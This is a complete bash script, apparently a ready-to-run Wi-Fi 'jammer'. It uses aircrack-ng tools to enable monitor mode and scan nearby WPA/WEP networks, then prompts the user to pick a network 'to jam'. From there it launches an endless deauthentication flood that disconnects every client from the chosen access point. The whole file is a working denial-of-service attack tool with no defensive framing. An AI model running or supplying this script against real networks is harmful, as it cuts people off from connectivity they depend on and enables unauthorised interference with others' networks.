#!/bin/bash

# Check root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

# Dependencies check
command -v airodump-ng >/dev/null 2>&1 || { echo >&2 "aircrack-ng is not installed. Aborting."; exit 1; }
command -v aireplay-ng >/dev/null 2>&1 || { echo >&2 "aircrack-ng is not installed. Aborting."; exit 1; }

# Select interface
echo "Available interfaces:"
interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
select INTERFACE in "${interfaces[@]}"; do
  [ -n "$INTERFACE" ] && break
done

# Kill conflicting processes
airmon-ng check kill > /dev/null 2>&1

# Start monitor mode
airmon-ng start "$INTERFACE" > /dev/null 2>&1

# Get monitor interface name
MONITOR_INTERFACE=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}')

if [ -z "$MONITOR_INTERFACE" ]; then
    echo "Monitor mode interface not found!"
    airmon-ng stop "$INTERFACE"
    exit 1
fi

# Create temp directory
TMP_DIR="/tmp/jammer_output"
mkdir -p "$TMP_DIR"
rm -f "$TMP_DIR/scan-01.csv"

# Scan nearby WiFi
echo "[*] Scanning nearby WiFi networks... (Scanning for 15 seconds)"
airodump-ng "$MONITOR_INTERFACE" --write "$TMP_DIR/scan" --output-format csv > /dev/null 2>&1 &
AIRODUMP_PID=$!
sleep 15
kill "$AIRODUMP_PID" > /dev/null 2>&1

# Read scanned networks
IFS=$'\n'
networks=($(awk -F ',' '/WPA|WEP/ && $14 {print $14}' "$TMP_DIR/scan-01.csv" | sed 's/^ //g' | uniq))

if [ ${#networks[@]} -eq 0 ]; then
  echo "No networks found!"
  airmon-ng stop "$MONITOR_INTERFACE"
  exit 1
fi

# Show networks
echo ""
echo "Available Networks:"
for i in "${!networks[@]}"; do
  echo "$((i+1)). ${networks[$i]}"
done

# User selects one
read -p "Select a WiFi network to jam (number): " choice
if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt "${#networks[@]}" ]; then
  echo "Invalid choice"
  airmon-ng stop "$MONITOR_INTERFACE"
  exit 1
fi

selected_ssid="${networks[$((choice-1))]}"

# Get BSSID and channel
bssid=$(awk -F ',' -v ssid="$selected_ssid" '$14 ~ ssid {print $1}' "$TMP_DIR/scan-01.csv" | head -n1)
channel=$(awk -F ',' -v ssid="$selected_ssid" '$14 ~ ssid {print $4}' "$TMP_DIR/scan-01.csv" | head -n1)

if [ -z "$bssid" ] || [ -z "$channel" ]; then
  echo "Failed to get BSSID or channel."
  airmon-ng stop "$MONITOR_INTERFACE"
  exit 1
fi

# Show target info
echo ""
echo "[*] Targeting SSID: $selected_ssid"
echo "[*] BSSID: $bssid"
echo "[*] Channel: $channel"

# Start airodump-ng window
xterm -hold -e "airodump-ng --bssid $bssid --channel $channel $MONITOR_INTERFACE" &

sleep 5

# Start deauth attack
echo ""
echo "[*] Starting deauth (jammer) attack... Press CTRL+C to stop."

trap "echo '[*] Stopping attack...'; airmon-ng stop $MONITOR_INTERFACE; exit" INT

aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE"

